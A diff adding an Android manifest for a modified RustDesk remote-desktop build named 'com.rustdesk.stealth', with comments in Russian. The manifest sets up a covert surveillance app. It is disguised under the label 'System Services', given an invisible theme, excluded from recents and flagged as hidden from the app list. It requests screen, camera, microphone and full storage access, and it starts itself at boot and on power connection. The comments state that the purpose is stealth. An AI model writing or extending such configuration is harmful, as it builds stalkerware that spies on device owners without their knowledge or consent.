@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.rustdesk.stealth">
+
+    <!-- Базовые разрешения для работы -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <!-- Разрешения для захвата экрана и аудио -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <!-- Критически важно для захвата экрана -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
+    <!-- Для работы в фоне -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <!-- Для Android 10+ -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <!-- Для Android 11+ -->
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+                    tools:ignore="ScopedStorage" />
+
+    <application
+        android:label="System Services"
+        android:theme="@android:style/Theme.NoDisplay"
+        android:allowBackup="true"
+        android:supportsRtl="true"
+        android:hasCode="true"
+        android:debuggable="false"
+        android:requestLegacyExternalStorage="true"
+        android:usesCleartextTraffic="true"
+        android:networkSecurityConfig="@xml/network_security_config"
+        android:enabled="true"
+        android:persistent="true">
+
+	<meta-data
+   		 android:name="flutterEmbedding"
+  		 android:value="2" />
+        <!-- Главная активность - полностью невидимая -->
+        <activity
+            android:name="com.rustdesk.stealth.MainActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.NoDisplay"
+            android:launchMode="singleTop"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:stateNotNeeded="true"
+            android:enabled="true"
+            android:finishOnTaskLaunch="true"
+            android:allowTaskReparenting="false">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+            <!-- Дополнительные фильтры для скрытности -->
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="systemservice" />
+            </intent-filter>
+        </activity>
+
+        <!-- Сервис для фоновой работы -->
+        <service
+            android:name="com.rustdesk.stealth.HeadlessService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection|camera|microphone"
+            android:isolatedProcess="false" />
+
+        <!-- Сервис для захвата экрана -->
+        <service
+            android:name="com.rustdesk.stealth.ScreenCaptureService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <!-- Ресивер для автозапуска после перезагрузки -->
+        <receiver
+            android:name="com.rustdesk.stealth.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Ресивер для запуска при подключении питания -->
+        <receiver
+            android:name="com.rustdesk.stealth.PowerConnectionReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Мета-данные для скрытия из списка приложений -->
+        <meta-data
+            android:name="android.app.hidden"
+            android:value="true" />
+
+    </application>
+
+</manifest>
